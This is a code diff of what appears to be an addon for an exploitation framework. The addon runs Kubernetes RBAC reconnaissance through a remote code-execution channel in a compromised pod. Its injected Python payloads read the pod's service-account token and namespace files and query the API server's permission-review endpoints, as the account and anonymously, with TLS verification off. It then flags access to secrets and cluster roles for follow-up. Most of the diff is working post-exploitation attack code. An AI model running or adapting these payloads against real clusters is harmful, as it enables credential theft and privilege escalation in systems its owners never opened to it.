@@ -3,43 +3,87 @@ import json
 def run(exploit, *args):
     G, R, Y, B, C, M, N = "\033[92m", "\033[91m", "\033[93m", "\033[94m", "\033[96m", "\033[95m", "\033[0m"
     
-    print(f"\n{B}[ K8S RBAC SWEEP: {C}url-shortener-sa{B} ]{N}")
-
-    payload = (
-        f"(lambda ns, token: (lambda conn: (conn.request('POST', '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews', "
-        f"body='{{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{{\"namespace\":\"' + ns + '\"}}}}', "
-        f"headers={{'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json'}}), "
-        f"conn.getresponse().read().decode())[1])"
-        f"(__import__('http.client').client.HTTPSConnection('kubernetes.default', context=__import__('ssl')._create_unverified_context())))"
-        f"(open('/var/run/secrets/kubernetes.io/serviceaccount/namespace').read().strip(), "
-        f"open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip())"
-    )
-
-    result = exploit.execute(payload)
-
+    # 1. Identity Discovery (Who am I?)
     try:
-        data = json.loads(result)
-        rules = data.get('status', {}).get('resourceRules', [])
-        found_verbs = {res: ",".join(r.get('verbs', [])) for res in ["secrets", "clusterroles"] 
-                       for r in rules if res in r.get('resources', []) or '*' in r.get('resources', [])}
+        who_payload = (
+            "(lambda conn: (conn.request('POST', '/apis/authentication.k8s.io/v1/selfsubjectreviews', "
+            "body='{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"SelfSubjectReview\"}', "
+            "headers={'Authorization': 'Bearer ' + open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip(), 'Content-Type': 'application/json'}), "
+            "conn.getresponse().read().decode())[1])(__import__('http.client').client.HTTPSConnection('kubernetes.default', "
+            "context=__import__('ssl')._create_unverified_context()))"
+        )
+        current_user = json.loads(exploit.execute(who_payload)).get('status', {}).get('userInfo', {}).get('username', 'Unknown-SA')
+    except:
+        current_user = "Unknown-SA"
 
-        interest = {"secrets": R, "clusterroles": M}
-        for res, color in interest.items():
-            if res in found_verbs:
-                print(f" {G}●{N} {res:<20} {G}ALLOWED{N}")
+    # 2. Namespace Discovery
+    try:
+        local_ns = exploit.execute("open('/var/run/secrets/kubernetes.io/serviceaccount/namespace').read().strip()")
+    except:
+        local_ns = "default"
 
-        if "secrets" in found_verbs:
-            print(f"\n {Y}Try: --addon k8s_list secrets{N}")
+    # 3. Define Targets: The Authenticated SA and the Anonymous User
+    targets = [
+        {"name": current_user, "token": "open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()", "color": C, "type": "AUTH"},
+        {"name": "system:anonymous", "token": "None", "color": Y, "type": "ANON"}
+    ]
 
-        if found_verbs:
-            print(f"\n{C}--- FORENSIC ANALYSIS ---{N}")
-            if "secrets" in found_verbs:
-                print(f" [{R}!{N}] {R}CRITICAL{N}: Access to {Y}{found_verbs['secrets']}{N} secrets detected.")
-            if "clusterroles" in found_verbs:
-                print(f" [{M}!{N}] {M}HIGH{N}: Ability to {Y}{found_verbs['clusterroles']}{N} cluster-wide roles.")
-            print("-" * 25)
+    print(f"\n{B}[ K8S DYNAMIC RBAC RECON ]{N}")
+    print(f"{B}{'IDENTITY':<70} {'SCOPE':<15} {'RESOURCE':<15} {'VERBS'}{N}")
+    print("-" * 120)
 
-    except Exception:
-        print(f" {R}!!{N} Recon failed. Raw: {result[:100]}")
+    findings = []
+    seen_keys = set() 
+
+    for target in targets:
+        # Check both Global (Cluster-wide) and Local (Namespace) scopes
+        for scope_label, ns_val in [("Global", "''"), (f"NS:{local_ns}", f"'{local_ns}'")]:
+            # The payload logic: If token is 'None', we don't send the Authorization header
+            payload = (
+                f"(lambda ns, token: (lambda conn: (lambda headers: ("
+                f"conn.request('POST', '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews', "
+                f"body='{{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{{\"namespace\":\"' + ns + '\"}}}}', "
+                f"headers=headers), "
+                f"conn.getresponse().read().decode())[1])"
+                f"({{'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token}} if token else {{'Content-Type': 'application/json'}}))"
+                f"(__import__('http.client').client.HTTPSConnection('kubernetes.default', context=__import__('ssl')._create_unverified_context())))"
+                f"({ns_val}, {target['token']})"
+            )
+
+            try:
+                res = exploit.execute(payload)
+                data = json.loads(res)
+                rules = data.get('status', {}).get('resourceRules', [])
+
+                for rule in rules:
+                    verbs = ",".join(sorted(rule.get('verbs', [])))
+                    resources = ",".join(sorted(rule.get('resources', [])))
+                    
+                    # Skip noise and ensure we only track unique findings
+                    if not verbs or "selfsubject" in resources:
+                        continue
+                    
+                    unique_key = f"{target['name']}-{scope_label}-{resources}-{verbs}"
+                    if unique_key not in seen_keys:
+                        print(f" {target['color']}{target['name']:<70} {N}{scope_label:<15} {resources:<15} {verbs}")
+                        findings.append({"id": target['name'], "scope": scope_label, "res": resources, "verbs": verbs, "type": target['type']})
+                        seen_keys.add(unique_key)
+            except:
+                continue
+
+    # 4. Forensic Analysis (Unique alerts only)
+    if findings:
+        print(f"\n{C}--- FORENSIC ANALYSIS ---{N}")
+        alerts = set()
+        for f in findings:
+            if "secrets" in f['res'] or "*" in f['res']:
+                risk = f"{R}CRITICAL{N}" if f['scope'] == "Global" or f['type'] == "ANON" else f"{Y}WARNING{N}"
+                msg = f" [{risk[5:6]}!] {risk}: {f['id']} has {B}{f['scope']}{N} access to {Y}{f['res']}{N}."
+                if msg not in alerts:
+                    print(msg)
+                    alerts.add(msg)
+        print("-" * 35)
+    else:
+        print(f"\n {G}●{N} No administrative permissions found.")
 
     print(f"\n{B}[ Operation Complete ]{N}\n")
